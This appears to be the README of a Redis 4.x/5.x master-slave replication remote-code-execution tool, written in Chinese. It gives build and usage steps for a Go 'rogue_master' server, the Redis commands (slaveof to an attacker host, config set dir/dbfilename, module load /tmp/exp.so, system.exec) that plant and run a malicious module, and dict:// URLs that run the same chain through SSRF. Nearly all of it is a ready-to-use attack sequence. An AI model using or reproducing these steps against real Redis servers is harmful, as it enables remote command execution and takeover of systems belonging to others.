# Redis 主从复制rce

漏洞影响版本 Redis4.x 5.x

## 利用方式

执行`go build -o rogue_master main.go`编译出可执行文件
默认启动rogue_master即可

```text
Usage of ./rogue_master:
  -lhost string
        listen host (default "0.0.0.0")
  -lport string
        listen port (default "21000")
  -os string
        payload (lin|osx) (default "lin")
```


```bash
slaveof ip port
config set dir /tmp
config set dbfilename exp.so
quit
```

```bash
slaveof no one
module load /tmp/exp.so
system.exec 'env'
quit
```

## 其他

dict或者gopher协议皆可

```text
dict://db:6379/config:set:dir:/tmp
dict://db:6379/config:set:dbfilename:exp.so
dict://db:6379/slaveof:ip:port
dict://db:6379/module:load:/tmp/exp.so
dict://db:6379/slave:no:one
dict://db:6379/system.exec:env
dict://db:6379/module:unload:system
```